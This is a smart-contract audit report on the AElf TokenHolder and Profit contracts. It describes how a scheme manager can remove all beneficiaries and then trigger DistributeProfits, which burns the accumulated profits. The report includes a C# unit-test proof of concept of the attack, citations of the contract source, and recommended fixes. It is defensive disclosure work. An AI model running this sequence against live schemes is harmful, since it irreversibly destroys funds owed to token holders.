# Audit Report

## Title
Scheme Manager Can Permanently Destroy All Accumulated Profits by Removing Beneficiaries Before Distribution

## Summary
A malicious TokenHolder scheme manager can exploit the profit distribution system to permanently destroy all accumulated profits by removing all beneficiaries before calling `DistributeProfits`. When distribution occurs with zero total shares, the system automatically burns the funds instead of distributing them, resulting in complete and irreversible loss of assets that legitimate beneficiaries were entitled to claim.

## Finding Description

TokenHolder schemes are created with `CanRemoveBeneficiaryDirectly = true` by default, granting the scheme manager unrestricted ability to remove beneficiaries at any time. [1](#0-0) 

The scheme manager can call `RemoveBeneficiary` to remove any beneficiary from the scheme. The manager validation occurs through `GetValidScheme(Context.Sender)` which confirms the sender is the scheme creator. [2](#0-1) 

Each removal is forwarded to the underlying Profit contract, which validates the caller and subtracts the removed beneficiary's shares from the scheme's `TotalShares`. [3](#0-2) 

When `CanRemoveBeneficiaryDirectly` is true, the `RemoveProfitDetails` function removes all beneficiary details without time restrictions or additional checks. [4](#0-3) 

The critical flaw occurs in `DistributeProfits`: when `totalShares <= 0`, the contract calls `BurnProfits` instead of distributing to beneficiaries. [5](#0-4) 

The `BurnProfits` function permanently destroys the tokens by transferring them to the contract itself and calling the Token contract's `Burn` method, with no recovery mechanism. [6](#0-5) 

The scheme manager has authorized access to both `RemoveBeneficiary` and `DistributeProfits` functions through the TokenHolder contract, enabling the complete attack sequence without external dependencies. [7](#0-6) 

Users register for profits by locking real tokens, expecting to earn profit distributions proportional to their locked amounts. When the manager removes them and burns profits, these locked tokens cannot earn the destroyed distributions. [8](#0-7) 

## Impact Explanation

This vulnerability enables **complete and permanent destruction of accumulated profits** with the following consequences:

1. **Total Fund Loss**: All tokens accumulated in the scheme are burned, permanently reducing the token supply. This is confirmed by test validation showing supply reduction when profits are burned. [9](#0-8) 

2. **Beneficiary Impact**: Legitimate beneficiaries who locked tokens to register for profit sharing lose their entire entitled distribution. Users lock real assets via `RegisterForProfits`, committing funds with the expectation of earning returns, but the manager can unilaterally destroy all accumulated profits.

3. **No Recovery**: The burning operation is irreversible - there is no mechanism in the Profit or TokenHolder contracts to restore burned tokens or compensate affected users.

4. **Protocol-Wide Impact**: The broader ecosystem suffers permanent token supply deflation, affecting all token holders and potentially destabilizing the token economics.

This qualifies as **HIGH severity** because it results in direct, complete, and irreversible loss of user funds through a simple two-step attack requiring only manager privileges.

## Likelihood Explanation

The likelihood is assessed as **MEDIUM-to-HIGH** based on:

**Attacker Profile**: The attacker must be or compromise a TokenHolder scheme manager. In typical use cases, these are DApp operators managing staking rewards or dividend distributions. Scheme managers are NOT system-trusted roles (unlike Parliament/Association/Referendum controllers), making insider threats or compromises realistic.

**Attack Complexity**: The attack is trivially simple:
- Step 1: Call `RemoveBeneficiary` for each beneficiary (can be batched or done sequentially)
- Step 2: Call `DistributeProfits`

**No Barriers**:
- No timelock between RemoveBeneficiary and DistributeProfits operations
- No governance approval required for either action
- No minimum shares validation before distribution
- Can be executed in a single block
- Both functions are directly accessible to the manager with standard authorization

**Realistic Scenarios**:
- Compromised DApp operator credentials
- Malicious exit scam by scheme operators
- Insider attack from disgruntled administrators
- Financial incentive to harm competitors or manipulate token supply

**Detection Challenges**: The removal transactions appear legitimate and authorized since the manager has valid permissions. Without real-time monitoring of beneficiary counts before distribution calls, the attack is only detected after funds are irreversibly destroyed.

## Recommendation

Implement one or more of the following protections:

1. **Prevent Distribution with Zero Shares**: Add a validation in `DistributeProfits` that reverts when `totalShares == 0` rather than burning:
   ```csharp
   Assert(totalShares > 0, "Cannot distribute profits with zero total shares.");
   ```

2. **Add Timelock for Removals**: Implement a delay period between beneficiary removal and profit distribution to allow detection and intervention.

3. **Restrict BurnProfits Path**: Only allow burning when explicitly intended (negative period), not as a fallback for zero shares. The condition should be:
   ```csharp
   if (input.Period < 0) return BurnProfits(...);
   Assert(totalShares > 0, "No beneficiaries to distribute to.");
   ```

4. **Governance for Bulk Removals**: Require multi-sig or governance approval when removing beneficiaries that would reduce total shares below a threshold.

5. **Make CanRemoveBeneficiaryDirectly Optional**: Don't default to `true` - require explicit opt-in during scheme creation with clear warnings about the implications.

## Proof of Concept

```csharp
[Fact]
public async Task TokenHolder_Manager_Can_Burn_All_Profits_By_Removing_Beneficiaries()
{
    // Setup: Create scheme and register beneficiaries with locked tokens
    var manager = Creators[0];
    var managerAddress = Address.FromPublicKey(CreatorKeyPair[0].PublicKey);
    
    await manager.CreateScheme.SendAsync(new CreateTokenHolderProfitSchemeInput
    {
        Symbol = "ELF",
        MinimumLockMinutes = 1
    });
    
    var scheme = await manager.GetScheme.CallAsync(managerAddress);
    
    // Users register and lock tokens
    for (int i = 1; i <= 5; i++)
    {
        await TokenHolderStubs[i].RegisterForProfits.SendAsync(new RegisterForProfitsInput
        {
            SchemeManager = managerAddress,
            Amount = 1000
        });
    }
    
    // Contribute profits
    const long profitAmount = 10000;
    await manager.ContributeProfits.SendAsync(new ContributeProfitsInput
    {
        SchemeManager = managerAddress,
        Symbol = "ELF",
        Amount = profitAmount
    });
    
    // Record supply before attack
    var supplyBefore = (await TokenContractStub.GetTokenInfo.CallAsync(new GetTokenInfoInput
    {
        Symbol = "ELF"
    })).Supply;
    
    // Attack: Manager removes all beneficiaries
    for (int i = 1; i <= 5; i++)
    {
        await manager.RemoveBeneficiary.SendAsync(new RemoveTokenHolderBeneficiaryInput
        {
            Beneficiary = Accounts[i].Address,
            Amount = 0 // Remove completely
        });
    }
    
    // Attack: Manager distributes with zero shares - triggers burn
    await manager.DistributeProfits.SendAsync(new DistributeProfitsInput
    {
        SchemeManager = managerAddress
    });
    
    // Verify: All profits were burned
    var supplyAfter = (await TokenContractStub.GetTokenInfo.CallAsync(new GetTokenInfoInput
    {
        Symbol = "ELF"
    })).Supply;
    
    supplyBefore.Sub(supplyAfter).ShouldBe(profitAmount); // Profits permanently destroyed
    
    // Beneficiaries cannot claim anything - their entitled profits are gone forever
}
```

### Citations

**File:** contract/AElf.Contracts.TokenHolder/TokenHolderContract.cs (L20-25)
```csharp
        State.ProfitContract.CreateScheme.Send(new CreateSchemeInput
        {
            Manager = Context.Sender,
            IsReleaseAllBalanceEveryTimeByDefault = true,
            CanRemoveBeneficiaryDirectly = true
        });
```

**File:** contract/AElf.Contracts.TokenHolder/TokenHolderContract.cs (L70-84)
```csharp
    public override Empty RemoveBeneficiary(RemoveTokenHolderBeneficiaryInput input)
    {
        var scheme = GetValidScheme(Context.Sender);

        var detail = State.ProfitContract.GetProfitDetails.Call(new GetProfitDetailsInput
        {
            Beneficiary = input.Beneficiary,
            SchemeId = scheme.SchemeId
        }).Details.Single();
        var lockedAmount = detail.Shares;
        State.ProfitContract.RemoveBeneficiary.Send(new RemoveBeneficiaryInput
        {
            SchemeId = scheme.SchemeId,
            Beneficiary = input.Beneficiary
        });
```

**File:** contract/AElf.Contracts.TokenHolder/TokenHolderContract.cs (L131-143)
```csharp
    public override Empty DistributeProfits(DistributeProfitsInput input)
    {
        var scheme = GetValidScheme(input.SchemeManager, true);
        Assert(Context.Sender == Context.GetContractAddressByName(SmartContractConstants.TokenContractSystemName) ||
               Context.Sender == input.SchemeManager, "No permission to distribute profits.");
        var distributeProfitsInput = new Profit.DistributeProfitsInput
        {
            SchemeId = scheme.SchemeId,
            Period = scheme.Period
        };
        if (input.AmountsMap != null && input.AmountsMap.Any()) distributeProfitsInput.AmountsMap.Add(input.AmountsMap);

        State.ProfitContract.DistributeProfits.Send(distributeProfitsInput);
```

**File:** contract/AElf.Contracts.TokenHolder/TokenHolderContract.cs (L159-176)
```csharp
        State.TokenContract.Lock.Send(new LockInput
        {
            LockId = lockId,
            Symbol = scheme.Symbol,
            Address = Context.Sender,
            Amount = input.Amount
        });
        State.LockIds[input.SchemeManager][Context.Sender] = lockId;
        State.LockTimestamp[lockId] = Context.CurrentBlockTime;
        State.ProfitContract.AddBeneficiary.Send(new AddBeneficiaryInput
        {
            SchemeId = scheme.SchemeId,
            BeneficiaryShare = new BeneficiaryShare
            {
                Beneficiary = Context.Sender,
                Shares = input.Amount
            }
        });
```

**File:** contract/AElf.Contracts.Profit/ProfitContract.cs (L224-263)
```csharp
    public override Empty RemoveBeneficiary(RemoveBeneficiaryInput input)
    {
        Assert(input.SchemeId != null, "Invalid scheme id.");
        Assert(input.Beneficiary != null, "Invalid Beneficiary address.");

        var scheme = State.SchemeInfos[input.SchemeId];

        Assert(scheme != null, "Scheme not found.");

        var currentDetail = State.ProfitDetailsMap[input.SchemeId][input.Beneficiary];

        if (scheme == null || currentDetail == null) return new Empty();

        Assert(Context.Sender == scheme.Manager || Context.Sender ==
            Context.GetContractAddressByName(SmartContractConstants.TokenHolderContractSystemName),
            "Only manager or token holder contract can add beneficiary.");

        var removedDetails = RemoveProfitDetails(scheme, input.Beneficiary, input.ProfitDetailId);

        foreach (var (removedMinPeriod, removedShares) in removedDetails.Where(d => d.Key != 0))
        {
            if (scheme.DelayDistributePeriodCount > 0)
            {
                for (var removedPeriod = removedMinPeriod;
                     removedPeriod < removedMinPeriod.Add(scheme.DelayDistributePeriodCount);
                     removedPeriod++)
                {
                    if (scheme.CachedDelayTotalShares.ContainsKey(removedPeriod))
                    {
                        scheme.CachedDelayTotalShares[removedPeriod] =
                            scheme.CachedDelayTotalShares[removedPeriod].Sub(removedShares);
                    }
                }
            }
        }

        State.SchemeInfos[input.SchemeId].TotalShares = scheme.TotalShares.Sub(removedDetails.Values.Sum());

        return new Empty();
    }
```

**File:** contract/AElf.Contracts.Profit/ProfitContract.cs (L321-324)
```csharp
        var detailsCanBeRemoved = scheme.CanRemoveBeneficiaryDirectly
            ? profitDetails.Details.Where(d => !d.IsWeightRemoved).ToList()
            : profitDetails.Details
                .Where(d => d.EndPeriod < scheme.CurrentPeriod && !d.IsWeightRemoved).ToList();
```

**File:** contract/AElf.Contracts.Profit/ProfitContract.cs (L485-486)
```csharp
        if (input.Period < 0 || totalShares <= 0)
            return BurnProfits(input.Period, profitsMap, scheme, profitsReceivingVirtualAddress);
```

**File:** contract/AElf.Contracts.Profit/ProfitContract.cs (L539-550)
```csharp
                Context.SendVirtualInline(scheme.SchemeId, State.TokenContract.Value,
                    nameof(State.TokenContract.Transfer), new TransferInput
                    {
                        To = Context.Self,
                        Amount = amount,
                        Symbol = symbol
                    }.ToByteString());
                State.TokenContract.Burn.Send(new BurnInput
                {
                    Amount = amount,
                    Symbol = symbol
                });
```

**File:** test/AElf.Contracts.Profit.Tests/BVT/SchemeTests.cs (L85-94)
```csharp
        var supplyBeforeBurning = (await TokenContractStub.GetTokenInfo.CallAsync(new GetTokenInfoInput
        {
            Symbol = ProfitContractTestConstants.NativeTokenSymbol
        })).Supply;
        await ContributeAndDistribute(creator, contributeAmountEachTime, period);
        var supplyAfterBurning = (await TokenContractStub.GetTokenInfo.CallAsync(new GetTokenInfoInput
        {
            Symbol = ProfitContractTestConstants.NativeTokenSymbol
        })).Supply;
        supplyBeforeBurning.Sub(supplyAfterBurning).ShouldBe(contributeAmountEachTime);
```
